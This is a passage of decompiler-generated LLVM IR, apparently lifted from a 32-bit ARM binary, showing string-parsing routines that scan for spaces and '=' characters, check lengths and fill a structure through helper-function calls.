  %v0_9168 = load i32, i32* @r6, align 4
  store i32 %v0_9168, i32* %r0.global-to-local, align 4
  %v3_916c = inttoptr i32 %v0_9168 to i8*
  %v4_916c = call i32 @function_127d0(i8* %v3_916c, i32 %v0_9160, i32 %v3_915c)
  store i32 %v4_916c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9170 = icmp eq i32 %v4_916c, 0
  store i1 %v2_9170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9170, label %.thread25, label %bb186

bb186:                                            ; preds = %bb185
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9178 = load i32, i32* @sl, align 4
  %v3_9178 = add i32 %v2_9178, 4
  %v4_9178 = inttoptr i32 %v3_9178 to i32*
  store i32 1, i32* %v4_9178, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb185, %dec_label_pc_90d8, %.thread24, %bb186
  store i32 0, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_9188 = load i32, i32* @sl, align 4
  %v2_9188 = add i32 %v1_9188, 8
  %v3_9188 = inttoptr i32 %v2_9188 to i32*
  store i32 0, i32* %v3_9188, align 4
  %v3_918c = call i32 @function_11b24(i32 41, i32* null)
  %v0_9190 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9190, i32* @r1, align 4
  store i32 %v3_918c, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_919c = call i32 @function_127d0(i8* %tmp168, i32 %v0_9190, i32 %v3_918c)
  store i32 %v4_919c, i32* %r0.global-to-local, align 4
  %v2_91a4 = icmp eq i32 %v4_919c, -1
  store i1 %v2_91a4, i1* %cpsr_c.global-to-local, align 1
  %v7_91a4 = icmp eq i32 %v4_919c, -1
  store i1 %v7_91a4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_91a4, label %.thread26, label %dec_label_pc_91b0

dec_label_pc_91b0:                                ; preds = %.thread25
  %v0_91b0 = load i32, i32* @r7, align 4
  store i32 %v0_91b0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_91b8 = inttoptr i32 %v0_91b0 to i32*
  %v3_91b8 = call i32 @function_11b24(i32 41, i32* %v2_91b8)
  %v0_91bc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91bc, i32* @r1, align 4
  store i32 %v3_91b8, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_91c8 = call i32 @function_127d0(i8* %tmp168, i32 %v0_91bc, i32 %v3_91b8)
  store i32 %v4_91c8, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* %ip.global-to-local, align 4
  %v2_91d0 = add i32 %v4_91c8, %v2_823c
  %v3_91d0 = inttoptr i32 %v2_91d0 to i8*
  %v4_91d0 = load i8, i8* %v3_91d0, align 1
  store i32 %v2_823c, i32* @lr, align 4
  %v2_91d8 = icmp ugt i8 %v4_91d0, 31
  store i1 %v2_91d8, i1* %cpsr_c.global-to-local, align 1
  %v7_91d8 = icmp eq i8 %v4_91d0, 32
  store i1 %v7_91d8, i1* %cpsr_z.global-to-local, align 1
  %v2_91e0 = zext i1 %v7_91d8 to i32
  %v2_91e0.v4_91c8 = add i32 %v2_91e0, %v4_91c8
  store i32 %v2_91e0.v4_91c8, i32* @r4, align 4
  %v2_91e4 = add i32 %v2_91e0.v4_91c8, %v2_823c
  store i32 %v2_91e4, i32* @r5, align 4
  store i32 %v2_91e4, i32* %r0.global-to-local, align 4
  %v1_91ec = load i32, i32* %fp.global-to-local, align 4
  %v2_91ec = sub i32 %v1_91ec, %v2_91e0.v4_91c8
  store i32 %v2_91ec, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_91f8 = call i32 @function_12538(i32 %v2_91e4, i32 %v2_91ec, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2)
  store i32 %v5_91f8, i32* %r0.global-to-local, align 4
  %v2_91fc = icmp eq i32 %v5_91f8, -1
  store i1 %v2_91fc, i1* %cpsr_c.global-to-local, align 1
  %v7_91fc = icmp eq i32 %v5_91f8, -1
  store i1 %v7_91fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_91fc, label %.thread26, label %dec_label_pc_9204

dec_label_pc_9204:                                ; preds = %dec_label_pc_91b0
  %v2_9204 = icmp ne i32 %v5_91f8, 0
  store i1 %v2_9204, i1* %cpsr_c.global-to-local, align 1
  %v7_9204 = icmp eq i32 %v5_91f8, 1
  store i1 %v7_9204, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8654, i32* %r1.global-to-local, align 4
  %v7_920c = icmp slt i32 %v5_91f8, 2
  br i1 %v7_920c, label %bb188, label %bb187

bb187:                                            ; preds = %dec_label_pc_9204
  %v9_920c = add i32 %v5_91f8, -2
  store i32 %v9_920c, i32* %r0.global-to-local, align 4
  br label %bb188

bb188:                                            ; preds = %dec_label_pc_9204, %bb187
  %v1_9214 = phi i32 [ %v5_91f8, %dec_label_pc_9204 ], [ %v9_920c, %bb187 ]
  store i32 %v2_86d0, i32* %r1.global-to-local, align 4
  %v2_9214 = add i32 %v1_9214, %v2_86d0
  %v1_9218 = load i32, i32* @r4, align 4
  %v2_9218 = add i32 %v2_9214, %v1_9218
  store i32 %v2_9218, i32* %r3.global-to-local, align 4
  %v0_921c = load i32, i32* @r7, align 4
  %v1_921c = trunc i32 %v0_921c to i8
  %v3_921c = load i32, i32* @r6, align 4
  %v4_921c = add i32 %v3_921c, %v2_9218
  %v5_921c = inttoptr i32 %v4_921c to i8*
  store i8 %v1_921c, i8* %v5_921c, align 1
  %v0_9220 = load i32, i32* @r5, align 4
  store i32 %v0_9220, i32* %r0.global-to-local, align 4
  %v1_9224 = inttoptr i32 %v0_9220 to i8*
  %v2_9224 = call i32 @function_12480(i8* %v1_9224)
  %v0_9228 = load i32, i32* @r7, align 4
  store i32 %v0_9228, i32* %r1.global-to-local, align 4
  store i32 %v2_9224, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_9234 = inttoptr i32 %v0_9228 to i32*
  %v3_9234 = call i32 @function_11b24(i32 42, i32* %v2_9234)
  %v0_9238 = load i32, i32* @r4, align 4
  store i32 %v0_9238, i32* @r1, align 4
  store i32 %v3_9234, i32* %r2.global-to-local, align 4
  %v0_9240 = load i32, i32* @r5, align 4
  store i32 %v0_9240, i32* %r0.global-to-local, align 4
  %v3_9244 = inttoptr i32 %v0_9240 to i8*
  %v4_9244 = call i32 @function_127d0(i8* %v3_9244, i32 %v0_9238, i32 %v3_9234)
  store i32 %v4_9244, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9248 = icmp eq i32 %v4_9244, 0
  store i1 %v2_9248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9248, label %.thread26, label %bb189

bb189:                                            ; preds = %bb188
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9250 = load i32, i32* @sl, align 4
  %v3_9250 = add i32 %v2_9250, 8
  %v4_9250 = inttoptr i32 %v3_9250 to i32*
  store i32 1, i32* %v4_9250, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb188, %dec_label_pc_91b0, %.thread25, %bb189
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_925c = call i32 @function_11b24(i32 40, i32* null)
  %v0_9260 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9260, i32* @r1, align 4
  store i32 %v3_925c, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_926c = call i32 @function_127d0(i8* %tmp168, i32 %v0_9260, i32 %v3_925c)
  store i32 %v4_926c, i32* %r0.global-to-local, align 4
  %v2_9270 = icmp eq i32 %v4_926c, -1
  store i1 %v2_9270, i1* %cpsr_c.global-to-local, align 1
  %v7_9270 = icmp eq i32 %v4_926c, -1
  store i1 %v7_9270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9270, label %.thread, label %dec_label_pc_9288

.thread:                                          ; preds = %.thread26
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9280 = load i32, i32* @sl, align 4
  %v3_9280 = add i32 %v2_9280, 12
  %v4_9280 = inttoptr i32 %v3_9280 to i32*
  store i32 0, i32* %v4_9280, align 4
  br label %dec_label_pc_930c

dec_label_pc_9288:                                ; preds = %.thread26
  store i32 -20773, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9290 = call i32 @function_11b24(i32 40, i32* null)
  %v0_9294 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9294, i32* @r1, align 4
  store i32 %v3_9290, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_92a0 = call i32 @function_127d0(i8* %tmp168, i32 %v0_9294, i32 %v3_9290)
  store i32 %v4_92a0, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* %r2.global-to-local, align 4
  %v2_92a8 = add i32 %v4_92a0, %v2_823c
  %v3_92a8 = inttoptr i32 %v2_92a8 to i8*
  %v4_92a8 = load i8, i8* %v3_92a8, align 1
  %v2_92ac = icmp ugt i8 %v4_92a8, 31
  store i1 %v2_92ac, i1* %cpsr_c.global-to-local, align 1
  %v7_92ac = icmp eq i8 %v4_92a8, 32
  store i1 %v7_92ac, i1* %cpsr_z.global-to-local, align 1
  %v2_92b8 = zext i1 %v7_92ac to i32
  %v2_92b8.v4_92a0 = add i32 %v2_92b8, %v4_92a0
  store i32 %v2_92b8.v4_92a0, i32* @r4, align 4
  %v2_92bc = add i32 %v2_92b8.v4_92a0, %v2_823c
  store i32 %v2_92bc, i32* @r5, align 4
  store i32 %v2_92bc, i32* %r0.global-to-local, align 4
  %v1_92c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_92c4 = sub i32 %v1_92c4, %v2_92b8.v4_92a0
  store i32 %v2_92c4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_92d0 = call i32 @function_12538(i32 %v2_92bc, i32 %v2_92c4, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2)
  store i32 %v5_92d0, i32* %r0.global-to-local, align 4
  %v2_92d4 = icmp eq i32 %v5_92d0, -1
  store i1 %v2_92d4, i1* %cpsr_c.global-to-local, align 1
  %v7_92d4 = icmp eq i32 %v5_92d0, -1
  store i1 %v7_92d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92d4, label %dec_label_pc_930c, label %dec_label_pc_92dc

dec_label_pc_92dc:                                ; preds = %dec_label_pc_9288
  %v2_92dc = icmp ne i32 %v5_92d0, 0
  store i1 %v2_92dc, i1* %cpsr_c.global-to-local, align 1
  %v7_92dc = icmp eq i32 %v5_92d0, 1
  store i1 %v7_92dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8654, i32* %ip.global-to-local, align 4
  %v7_92e4 = icmp slt i32 %v5_92d0, 2
  br i1 %v7_92e4, label %bb191, label %bb190

bb190:                                            ; preds = %dec_label_pc_92dc
  %v9_92e4 = add i32 %v5_92d0, -2
  store i32 %v9_92e4, i32* %r0.global-to-local, align 4
  br label %bb191

bb191:                                            ; preds = %dec_label_pc_92dc, %bb190
  %v1_92ec = phi i32 [ %v5_92d0, %dec_label_pc_92dc ], [ %v9_92e4, %bb190 ]
  store i32 %v2_86d0, i32* %ip.global-to-local, align 4
  %v2_92ec = add i32 %v1_92ec, %v2_86d0
  %v1_92f0 = load i32, i32* @r4, align 4
  %v2_92f0 = add i32 %v2_92ec, %v1_92f0
  store i32 %v2_92f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_92f8 = load i32, i32* @r5, align 4
  store i32 %v0_92f8, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_9300 = load i32, i32* @r6, align 4
  %v4_9300 = add i32 %v3_9300, %v2_92f0
  %v5_9300 = inttoptr i32 %v4_9300 to i8*
  store i8 0, i8* %v5_9300, align 1
  %v2_9304 = inttoptr i32 %v0_92f8 to i8*
  %v3_9304 = call i32 @function_125a4(i8* %v2_9304, i32 10)
  store i32 %v3_9304, i32* %r0.global-to-local, align 4
  %v1_9308 = load i32, i32* @sl, align 4
  %v2_9308 = add i32 %v1_9308, 12
  %v3_9308 = inttoptr i32 %v2_9308 to i32*
  store i32 %v3_9304, i32* %v3_9308, align 4
  br label %dec_label_pc_930c

dec_label_pc_930c:                                ; preds = %.thread, %dec_label_pc_9288, %bb191
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9310

dec_label_pc_9310:                                ; preds = %dec_label_pc_94dc, %dec_label_pc_945c, %dec_label_pc_930c
  %v1_931c = phi i32 [ 0, %dec_label_pc_930c ], [ %v0_945c, %dec_label_pc_945c ], [ %v1_931c.pre.pre, %dec_label_pc_94dc ]
  store i32 %v2_823c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_931c = add i32 %v1_931c, %v2_823c
  store i32 %v2_931c, i32* @r4, align 4
  %v3_9320 = call i32 @function_11b24(i32 39, i32* null)
  %v0_9324 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9324, i32* @r1, align 4
  store i32 %v3_9320, i32* %r2.global-to-local, align 4
  %v0_932c = load i32, i32* @r4, align 4
  store i32 %v0_932c, i32* %r0.global-to-local, align 4
  %v3_9330 = inttoptr i32 %v0_932c to i8*
  %v4_9330 = call i32 @function_127d0(i8* %v3_9330, i32 %v0_9324, i32 %v3_9320)
  store i32 %v4_9330, i32* %r0.global-to-local, align 4
  store i32 -20773, i32* %ip.global-to-local, align 4
  %v2_933c = icmp eq i32 %v4_9330, -1
  store i1 %v2_933c, i1* %cpsr_c.global-to-local, align 1
  %v7_933c = icmp eq i32 %v4_9330, -1
  store i1 %v7_933c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_933c, label %dec_label_pc_9548, label %dec_label_pc_9348

dec_label_pc_9348:                                ; preds = %dec_label_pc_9310
  %v0_9348 = load i32, i32* @sl, align 4
  %v1_9348 = add i32 %v0_9348, 16
  %v2_9348 = inttoptr i32 %v1_9348 to i32*
  %v3_9348 = load i32, i32* %v2_9348, align 4
  store i32 %v3_9348, i32* %r3.global-to-local, align 4
  %v2_934c = icmp ugt i32 %v3_9348, 3
  store i1 %v2_934c, i1* %cpsr_c.global-to-local, align 1
  %v7_934c = icmp eq i32 %v3_9348, 4
  store i1 %v7_934c, i1* %cpsr_z.global-to-local, align 1
  %v8_9350 = icmp sgt i32 %v3_9348, 4
  br i1 %v8_9350, label %dec_label_pc_9548, label %dec_label_pc_9354

dec_label_pc_9354:                                ; preds = %dec_label_pc_9348
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_935c = call i32 @function_11b24(i32 39, i32* null)
  %v0_9360 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9360, i32* @r1, align 4
  store i32 %v3_935c, i32* %r2.global-to-local, align 4
  %v0_9368 = load i32, i32* @r4, align 4
  store i32 %v0_9368, i32* %r0.global-to-local, align 4
  %v3_936c = inttoptr i32 %v0_9368 to i8*
  %v4_936c = call i32 @function_127d0(i8* %v3_936c, i32 %v0_9360, i32 %v3_935c)
  store i32 %v4_936c, i32* %r0.global-to-local, align 4
  %v1_9374 = load i32, i32* @r5, align 4
  %v2_9374 = add i32 %v1_9374, %v4_936c
  store i32 %v2_9374, i32* @r8, align 4
  %v2_9378 = add i32 %v2_9374, %v2_823c
  %v3_9378 = inttoptr i32 %v2_9378 to i8*
  %v4_9378 = load i8, i8* %v3_9378, align 1
  %v6_9378 = zext i8 %v4_9378 to i32
  store i32 %v6_9378, i32* %r3.global-to-local, align 4
  %v2_937c = icmp ugt i8 %v4_9378, 31
  store i1 %v2_937c, i1* %cpsr_c.global-to-local, align 1
  %v7_937c = icmp eq i8 %v4_9378, 32
  store i1 %v7_937c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_937c, label %bb192, label %bb193

bb192:                                            ; preds = %dec_label_pc_9354
  %v2_9380 = add i32 %v4_936c, 1
  store i32 %v2_9380, i32* %r0.global-to-local, align 4
  br label %bb193

bb193:                                            ; preds = %dec_label_pc_9354, %bb192
  %v1_9390 = phi i32 [ %v4_936c, %dec_label_pc_9354 ], [ %v2_9380, %bb192 ]
  %v1_9384 = load i32, i32* %fp.global-to-local, align 4
  %v2_9384 = sub i32 %v1_9384, %v1_9374
  store i32 %v2_9384, i32* %r3.global-to-local, align 4
  %v2_9388 = sub i32 %v2_9384, %v1_9390
  store i32 %v2_9388, i32* @r7, align 4
  %v0_938c = load i32, i32* @r4, align 4
  %v2_938c = add i32 %v0_938c, %v1_9390
  store i32 %v2_938c, i32* @r6, align 4
  br i1 %v7_937c, label %bb194, label %bb195

bb194:                                            ; preds = %bb193
  %v3_9390 = add i32 %v1_9390, %v1_9374
  store i32 %v3_9390, i32* @r8, align 4
  br label %bb195

bb195:                                            ; preds = %bb193, %bb194
  store i32 %v2_9388, i32* %r1.global-to-local, align 4
  store i32 %v2_938c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_93a4 = call i32 @function_12538(i32 %v2_938c, i32 %v2_9388, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2)
  store i32 %v5_93a4, i32* %r0.global-to-local, align 4
  %v2_93a8 = icmp eq i32 %v5_93a4, -1
  store i1 %v2_93a8, i1* %cpsr_c.global-to-local, align 1
  %v7_93a8 = icmp eq i32 %v5_93a4, -1
  store i1 %v7_93a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_93a4, i32* @r4, align 4
  br i1 %v7_93a8, label %dec_label_pc_945c, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %bb195
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  %v2_93b8 = icmp ne i32 %v5_93a4, 0
  store i1 %v2_93b8, i1* %cpsr_c.global-to-local, align 1
  %v7_93b8 = icmp eq i32 %v5_93a4, 1
  store i1 %v7_93b8, i1* %cpsr_z.global-to-local, align 1
  %v7_93bc = icmp slt i32 %v5_93a4, 2
  br i1 %v7_93bc, label %bb197, label %bb196

bb196:                                            ; preds = %dec_label_pc_93b4
  %v9_93bc = add i32 %v5_93a4, -2
  store i32 %v9_93bc, i32* @r4, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_93b4, %bb196
  %v1_93c0 = load i32, i32* @r8, align 4
  %v2_93c0 = add i32 %v1_93c0, %v2_823c
  store i32 %v2_93c0, i32* @r5, align 4
  %v0_93c4 = load i32, i32* @r6, align 4
  store i32 %v0_93c4, i32* %r0.global-to-local, align 4
  %v0_93c8 = load i32, i32* @r7, align 4
  store i32 %v0_93c8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1852c.36 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_93d4 = call i32 @function_12538(i32 %v0_93c4, i32 %v0_93c8, i32 ptrtoint (i32* @global_var_1852c.36 to i32), i32 1)
  store i32 %v4_93d4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_93d8 = icmp eq i32 %v4_93d4, 0
  store i1 %v2_93d8, i1* %cpsr_z.global-to-local, align 1
  %tmp198 = icmp slt i32 %v4_93d4, 1
  br i1 %tmp198, label %.dec_label_pc_93f8_crit_edge, label %dec_label_pc_93e0

.dec_label_pc_93f8_crit_edge:                     ; preds = %bb197
  %v1_9400.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_93f8

dec_label_pc_93e0:                                ; preds = %bb197
  %v0_93e0 = load i32, i32* @r6, align 4
  store i32 %v0_93e0, i32* %r0.global-to-local, align 4
  %v0_93e4 = load i32, i32* @r7, align 4
  store i32 %v0_93e4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1852c.36 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_93f0 = call i32 @function_12538(i32 %v0_93e0, i32 %v0_93e4, i32 ptrtoint (i32* @global_var_1852c.36 to i32), i32 1)
  store i32 %v4_93f0, i32* %r0.global-to-local, align 4
  %v1_93f4 = add i32 %v4_93f0, -1
  store i32 %v1_93f4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_93f8

dec_label_pc_93f8:                                ; preds = %.dec_label_pc_93f8_crit_edge, %dec_label_pc_93e0
  %v1_9400 = phi i32 [ %v1_9400.pre, %.dec_label_pc_93f8_crit_edge ], [ %v1_93f4, %dec_label_pc_93e0 ]
  %v2_9400 = add i32 %v1_9400, %v2_86d0
  store i32 -20773, i32* @lr, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_940c = load i32, i32* @r8, align 4
  %v2_940c = add i32 %v2_9400, %v1_940c
  store i32 %v2_940c, i32* %r3.global-to-local, align 4
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v4_9414 = add i32 %v2_940c, -20773
  %v5_9414 = inttoptr i32 %v4_9414 to i8*
  store i8 0, i8* %v5_9414, align 1
  %storemerge6.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9434.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9434

dec_label_pc_9420:                                ; preds = %dec_label_pc_9434
  br i1 %v7_9424, label %dec_label_pc_9464, label %dec_label_pc_942c

dec_label_pc_942c:                                ; preds = %dec_label_pc_9420
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9434

dec_label_pc_9434:                                ; preds = %dec_label_pc_93f8, %dec_label_pc_942c
  %v0_9434 = phi i32 [ %v0_9420, %dec_label_pc_942c ], [ %v0_9434.pre, %dec_label_pc_93f8 ]
  %storemerge6 = phi i32 [ %v1_9448, %dec_label_pc_942c ], [ %storemerge6.pre, %dec_label_pc_93f8 ]
  store i32 %storemerge6, i32* %stack_var_-44, align 4
  store i32 %v0_9434, i32* %r0.global-to-local, align 4
  %v1_9438 = inttoptr i32 %v0_9434 to i8*
  %v2_9438 = call i32 @function_12480(i8* %v1_9438)
  store i32 %v2_9438, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_9440 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9440, i32* %r4.global-to-local, align 4
  %v3_9444 = icmp uge i32 %v2_9438, %v3_9440
  store i1 %v3_9444, i1* %cpsr_c.global-to-local, align 1
  %v9_9444 = icmp eq i32 %v2_9438, %v3_9440
  store i1 %v9_9444, i1* %cpsr_z.global-to-local, align 1
  %v1_9448 = add i32 %v3_9440, 1
  store i32 %v1_9448, i32* %ip.global-to-local, align 4
  %v8_944c = icmp sgt i32 %v2_9438, %v3_9440
  %v0_9420 = load i32, i32* @r5, align 4
  %v2_9420 = add i32 %v0_9420, %v3_9440
  %v3_9420 = inttoptr i32 %v2_9420 to i8*
  %v4_9420 = load i8, i8* %v3_9420, align 1
  %v6_9420 = zext i8 %v4_9420 to i32
  store i32 %v6_9420, i32* %r3.global-to-local, align 4
  %v2_9424 = icmp ugt i8 %v4_9420, 60
  store i1 %v2_9424, i1* %cpsr_c.global-to-local, align 1
  %v7_9424 = icmp eq i8 %v4_9420, 61
  store i1 %v7_9424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_944c, label %dec_label_pc_9420, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9434
  br i1 %v7_9424, label %dec_label_pc_9464, label %dec_label_pc_945c

dec_label_pc_945c:                                ; preds = %dec_label_pc_94a8, %dec_label_pc_94cc, %dec_label_pc_9450, %bb195
  %v0_945c = load i32, i32* @r8, align 4
  store i32 %v0_945c, i32* @r5, align 4
  br label %dec_label_pc_9310

dec_label_pc_9464:                                ; preds = %dec_label_pc_9420, %dec_label_pc_9450
  %v0_9464 = load i32, i32* @sl, align 4
  %v1_9464 = add i32 %v0_9464, 16
  %v2_9464 = inttoptr i32 %v1_9464 to i32*
  %v3_9464 = load i32, i32* %v2_9464, align 4
  store i32 %v3_9464, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82b0, i32* @lr, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9470 = icmp eq i32 %v3_9464, 0
  store i1 %v2_9470, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %tmp199 = icmp slt i32 %v3_9464, 1
  br i1 %tmp199, label %dec_label_pc_94cc, label %dec_label_pc_947c

dec_label_pc_947c:                                ; preds = %dec_label_pc_9464
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_9484:                                ; preds = %dec_label_pc_94a8
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_9488 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9488, i32* %r3.global-to-local, align 4
  %v0_948c = load i32, i32* @sl, align 4
  %v1_948c = add i32 %v0_948c, 16
  %v2_948c = inttoptr i32 %v1_948c to i32*
  %v3_948c = load i32, i32* %v2_948c, align 4
  %v1_9490 = add i32 %v3_9488, 1
  store i32 %v1_9490, i32* %ip.global-to-local, align 4
  %v3_9494 = icmp uge i32 %v3_948c, %v1_9490
  store i1 %v3_9494, i1* %cpsr_c.global-to-local, align 1
  %v9_9494 = icmp eq i32 %v3_948c, %v1_9490
  store i1 %v9_9494, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  store i32 %v1_9490, i32* %r1.global-to-local, align 4
  store i32 %v1_9490, i32* %stack_var_-44, align 4
  %v7_94a4 = icmp sgt i32 %v3_948c, %v1_9490
  %v0_94b4.pre = load i32, i32* @r5, align 4
  br i1 %v7_94a4, label %dec_label_pc_9484.dec_label_pc_94a8_crit_edge, label %dec_label_pc_94cc

dec_label_pc_9484.dec_label_pc_94a8_crit_edge:    ; preds = %dec_label_pc_9484
  %v0_94b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_94a8:                                ; preds = %dec_label_pc_9484.dec_label_pc_94a8_crit_edge, %dec_label_pc_947c
  %v0_94b8 = phi i32 [ %v0_94b8.pre, %dec_label_pc_9484.dec_label_pc_94a8_crit_edge ], [ %v3_9440, %dec_label_pc_947c ]
  %v0_94b4 = phi i32 [ %v0_94b4.pre, %dec_label_pc_9484.dec_label_pc_94a8_crit_edge ], [ %v0_9420, %dec_label_pc_947c ]
  %v0_94a8 = phi i32 [ %v1_9490, %dec_label_pc_9484.dec_label_pc_94a8_crit_edge ], [ 0, %dec_label_pc_947c ]
  %v1_94a8 = and i32 %v0_94a8, 33554432
  %v2_94a8 = icmp ne i32 %v1_94a8, 0
  store i1 %v2_94a8, i1* %cpsr_c.global-to-local, align 1
  %v3_94a8 = mul i32 %v0_94a8, 128
  %v1_94ac = add i32 %v3_94a8, 1472
  %v0_94b0 = load i32, i32* %sb.global-to-local, align 4
  %v2_94b0 = add i32 %v1_94ac, %v0_94b0
  store i32 %v2_94b0, i32* %r1.global-to-local, align 4
  store i32 %v0_94b4, i32* %r0.global-to-local, align 4
  store i32 %v0_94b8, i32* %r2.global-to-local, align 4
  %v3_94bc = inttoptr i32 %v0_94b4 to i8*
  %v4_94bc = call i32 @function_128e0(i8* %v3_94bc, i32 %v2_94b0, i32 %v0_94b8)
  store i32 %v4_94bc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94c0 = icmp eq i32 %v4_94bc, 0
  store i1 %v2_94c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94c0, label %dec_label_pc_9484, label %dec_label_pc_945c

dec_label_pc_94cc:                                ; preds = %dec_label_pc_9484, %dec_label_pc_9464
  %v0_94cc = phi i32 [ %v0_9420, %dec_label_pc_9464 ], [ %v0_94b4.pre, %dec_label_pc_9484 ]
  store i32 %v0_94cc, i32* %r0.global-to-local, align 4
  %v1_94d0 = inttoptr i32 %v0_94cc to i8*
  %v2_94d0 = call i32 @function_12480(i8* %v1_94d0)
  store i32 %v2_94d0, i32* %r0.global-to-local, align 4
  %v2_94d4 = icmp ugt i32 %v2_94d0, 126
  store i1 %v2_94d4, i1* %cpsr_c.global-to-local, align 1
  %v7_94d4 = icmp eq i32 %v2_94d0, 127
  store i1 %v7_94d4, i1* %cpsr_z.global-to-local, align 1
  %v8_94d8 = icmp sgt i32 %v2_94d0, 127
  br i1 %v8_94d8, label %dec_label_pc_945c, label %dec_label_pc_94dc

dec_label_pc_94dc:                                ; preds = %dec_label_pc_94cc
  %v0_94dc = load i32, i32* @sl, align 4
  %v1_94dc = add i32 %v0_94dc, 16
  %v2_94dc = inttoptr i32 %v1_94dc to i32*
  %v3_94dc = load i32, i32* %v2_94dc, align 4
  %v1_94e0 = and i32 %v3_94dc, 33554432
  %v2_94e0 = icmp ne i32 %v1_94e0, 0
  store i1 %v2_94e0, i1* %cpsr_c.global-to-local, align 1
